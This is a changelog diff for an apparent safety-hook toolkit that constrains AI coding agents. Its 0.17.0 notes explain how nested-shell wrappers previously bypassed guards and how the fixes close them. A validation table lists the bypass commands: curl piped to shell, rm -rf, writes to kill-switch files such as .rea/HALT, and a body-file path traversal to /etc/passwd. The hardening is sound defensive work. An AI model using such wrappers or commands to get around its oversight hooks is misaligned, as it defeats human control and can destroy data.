@@ -1,5 +1,166 @@
 # @bookedsolid/rea
 
+## 0.17.0
+
+### Minor Changes
+
+- 3dbb638: Comprehensive Bash-tier hardening (helix-017 + helix-018 + helix-019) and install idempotency.
+
+  The 0.17.0 minor bump consolidates every open consumer-reported finding
+  plus a long-standing install-idempotency defect. Three full-cycle
+  root-cause classes resolved, one architectural mechanism re-shaped,
+  plus byte-identical re-init.
+
+  ### helix-017 — Nested-shell wrapper bypass closed (3 P1/P2)
+
+  Pre-fix `bash -c 'PAYLOAD'`, `sh -lc "PAYLOAD"`, and equivalents
+  defeated every Bash-tier guard. The outer segment's first token was
+  `bash` so all `any_segment_starts_with` checks skipped. A single shell
+  wrapper bypassed H1/H3-H17 in dangerous-bash-interceptor, the redirect
+  detector in protected-paths-bash-gate, and the install-pattern check
+  in dependency-audit-gate.
+
+  `hooks/_lib/cmd-segments.sh` gains `_rea_unwrap_nested_shells` —
+  recognizes `(bash|sh|zsh|dash|ksh) [flags] -(c|lc|lic|ic|cl|cli|li|il)
+QUOTED_ARG` patterns and emits each inner PAYLOAD as a separate
+  record. `_rea_split_segments` runs the unwrap as its first stage so
+  quote-mask + separator-split process the wrapper line + every inner
+  payload uniformly. `dependency-audit-gate.sh` migrated to use the
+  shared splitter so it inherits unwrap + the full separator set.
+  `dangerous-bash-interceptor.sh` H12 (curl/wget piped to shell) now
+  scans every unwrap-emitted line so `zsh -c "curl https://x | sh"` is
+  caught.
+
+  Single-quoted bodies have no escape semantics; double-quoted bodies
+  treat `\"` and `\\` as literal POSIX escapes. Multiple wrappers per
+  command-line are handled. One level of unwrapping today; deeper
+  nesting is additive without changing the contract.
+
+  ### helix-018 Option A — Full policy-driven `protected_writes`
+
+  Pre-fix `_lib/protected-paths.sh::REA_PROTECTED_PATTERNS_FULL` was
+  hardcoded. 0.16.3 F7 added `protected_paths_relax` (subtract from the
+  hardcoded set); 0.17.0 adds `protected_writes` (declare the set).
+
+  When `protected_writes` is set in `.rea/policy.yaml`, it fully owns
+  the protected list — kill-switch invariants (`.rea/HALT`,
+  `.rea/policy.yaml`, `.claude/settings.json`) are always added back
+  regardless. `protected_paths_relax` then runs as a subtractor on
+  whatever set is in effect (kill-switch invariants remain
+  non-relaxable). Both keys can coexist; precedence is documented in
+  the lib header.
+
+  ```yaml
+  # Add a new path the default doesn't know about
+  protected_writes:
+    - .claude/settings.json
+    - .claude/settings.local.json
+    - .husky/pre-commit
+    - .husky/commit-msg
+    - .husky/pre-push
+    - .github/workflows/ # NEW — protect CI workflows from agent edits
+  ```
+
+  The `.husky/{commit-msg,pre-push,pre-commit}.d/*` extension surface
+  shipped in 0.16.4 still overrides protection because the
+  `rea_path_is_extension_surface` helper short-circuits before the
+  pattern check.
+
+  zod schema in `src/policy/loader.ts`, type in `src/policy/types.ts`,
+  profile schema in `src/policy/profiles.ts` all extended.
+
+  ### helix-019 — Three findings in 0.16.4 new code
+
+  **019 #1 [P1]** `security-disclosure-gate.sh` `--body-file` traversal
+  silently skipped. Pre-fix paths whose canonical form used `..` to
+  escape REA_ROOT logged "skipping body scan" and exited 0 — every
+  sensitive payload at the resolved external location bypassed the
+  disclosure gate. 0.17.0 hard-refuses with exit 2 + actionable stderr
+  advisory naming the path and resolved form.
+
+  **019 #2 [P2]** `_extract_body_file_paths` whitespace tokenizer broke
+  quoted paths. Pre-fix `--body-file "security notes.md"` was split
+  into 3 tokens; the hook tried to read `"security` (with leading
+  quote), failed, and silently omitted the body from the scan. 0.17.0
+  walks the command with quote-state awareness — single- and
+  double-quoted spans treat whitespace as part of the token. Inner
+  escapes (`\"`, `\\`) handled per POSIX.
+
+  **019 #3 [P2]** `dependency-audit-gate.sh` background-`&` regression.
+  The local segmenter splat on `||&&;|` only — bare `&` was missing.
+  `echo warmup & pnpm add typo-pkg` stayed merged into one segment so
+  the install-pattern leading-token check skipped the install. 0.17.0
+  migrates audit-gate to `_rea_split_segments` from the shared lib,
+  inheriting bare `&` (added in 0.16.1) plus quote-mask + nested-shell
+  unwrap.
+
+  ### Install idempotency
+
+  Pre-fix, every `rea init` re-stamped `installed_at` in
+  `.rea/policy.yaml` and `.rea/install-manifest.json` with `new
+Date().toISOString()`. Re-running init produced a non-empty diff.
+
+  0.17.0 reads the existing `installed_at` from each file (if present)
+  and preserves it. The first install date is the semantic truth —
+  re-runs reflect refreshes, not new installs. Falls back to
+  `new Date()` only when the file is absent or unparseable.
+
+  Verified empirically: `cp -r` rea repo to tmpdir, `npm install
+@bookedsolid/rea`, run `rea init --yes` twice, `find | sha256sum` on
+  both states — diff is now empty.
+
+  ### Test coverage
+  - 1247 vitest tests pass (was 1218 in 0.16.4), +29 new fixtures
+  - Bash-tier corpus: 110 entries (was 73 in 0.16.2), +37 across the
+    cycle
+  - 5 helix-017 fixtures for dangerous-bash (every wrapper variant +
+    zsh -c curl-pipe)
+  - 6 helix-017 fixtures for protected-paths-bash-gate (4 protected
+    paths + double-quoted body + benign passthrough)
+  - 2 helix-017 fixtures for dependency-audit (npm + pnpm wrappers)
+  - 7 helix-018 Option A fixtures (default, override, kill-switch
+    invariants always-on, additive, override + relax precedence)
+  - 5 helix-019 fixtures (traversal refuse + quoted-spaces sensitive +
+    quoted-spaces single-quote + quoted-spaces benign + background-&
+    audit)
+  - 2 idempotency fixtures in `src/cli/init.test.ts` (policy.yaml +
+    install-manifest.json `installed_at` preservation)
+  - All 6 quality gates green: test, test:dogfood, test:bash-syntax,
+    lint, type-check, build
+
+  ### Empirical validation
+
+  | Hook                           | Case                                                   | Pre-fix             | This release                       |
+  | ------------------------------ | ------------------------------------------------------ | ------------------- | ---------------------------------- |
+  | dangerous-bash-interceptor     | `bash -lc 'git push --force origin HEAD'`              | allow (bypass)      | block                              |
+  | dangerous-bash-interceptor     | `sh -c 'rm -rf .'`                                     | allow               | block                              |
+  | dangerous-bash-interceptor     | `bash -c 'git commit --no-verify -m fix'`              | allow               | block                              |
+  | dangerous-bash-interceptor     | `zsh -c "curl https://x \| sh"`                        | allow               | block                              |
+  | dangerous-bash-interceptor     | `bash -lic 'git restore .'`                            | allow               | block                              |
+  | protected-paths-bash-gate      | `bash -lc 'printf x > .rea/HALT'`                      | allow               | block                              |
+  | protected-paths-bash-gate      | `sh -c 'echo evil > .rea/policy.yaml'`                 | allow               | block                              |
+  | protected-paths-bash-gate      | `bash -c 'cat /dev/null > .claude/settings.json'`      | allow               | block                              |
+  | protected-paths-bash-gate      | `bash -lc 'cp evil .husky/pre-push'`                   | allow               | block                              |
+  | protected-paths-bash-gate      | `bash -c "printf x > .rea/HALT"` (double-quote)        | allow               | block                              |
+  | protected-paths-bash-gate      | `bash -c 'echo hello > docs/notes.md'` (benign)        | allow               | allow                              |
+  | dependency-audit-gate          | `bash -lc 'npm install pkg'`                           | allow (bypass)      | block                              |
+  | dependency-audit-gate          | `sh -c 'pnpm add pkg'`                                 | allow               | block                              |
+  | dependency-audit-gate          | `echo warmup & pnpm add pkg`                           | allow               | block                              |
+  | dependency-audit-gate          | `sleep 0 & npm install pkg`                            | allow               | block                              |
+  | security-disclosure-gate       | `gh issue create --body-file ../../etc/passwd`         | allow (silent skip) | refuse                             |
+  | security-disclosure-gate       | `gh issue create --body-file "name with spaces.md"`    | allow (silent skip) | block (sensitive) / allow (benign) |
+  | protected-paths-bash-gate (F7) | default policy + `.github/workflows/release.yml` write | allow               | allow                              |
+  | protected-paths-bash-gate (F7) | `protected_writes: [.github/workflows/]` + same write  | allow               | block                              |
+  | `rea init` × 2                 | second run mutates policy.yaml + manifest              | non-idempotent      | byte-identical                     |
+
+  ### Convergence
+
+  helix's report 019 confirms every prior open finding (014, 015, 016,
+  016-1, 016-2, 017, 018) is closed in shipped releases. Cycle 6 was
+  the first with zero carry-overs. 0.17.0 closes the three new findings
+  (019 #1, #2, #3) in one shot. The remaining work shifts to fixture
+  corpus expansion — already on track at 110 entries.
+
 ## 0.16.4
 
 ### Patch Changes
@@ -827,13 +988,13 @@ codex-review --also-set-cache`) on every push, produced a 1,250-line bash
 
   This release replaces the entire stack with a stateless gate:
 
-                              git push
-                                → .husky/pre-push → rea hook push-gate
-                                → codex exec review --base <ref> --json
-                                → parse verdict from streamed findings
-                                → block on [P1] (blocking) or [P2] when concerns_blocks=true
-                                → write .rea/last-review.json + audit record
-                                → exit 0 / 1 (HALT) / 2 (blocked)
+                                git push
+                                  → .husky/pre-push → rea hook push-gate
+                                  → codex exec review --base <ref> --json
+                                  → parse verdict from streamed findings
+                                  → block on [P1] (blocking) or [P2] when concerns_blocks=true
+                                  → write .rea/last-review.json + audit record
+                                  → exit 0 / 1 (HALT) / 2 (blocked)
 
   Codex is run fresh on every push. No cache. No SHA matching. No receipt
   consultation. When the gate blocks, Claude reads stderr + the
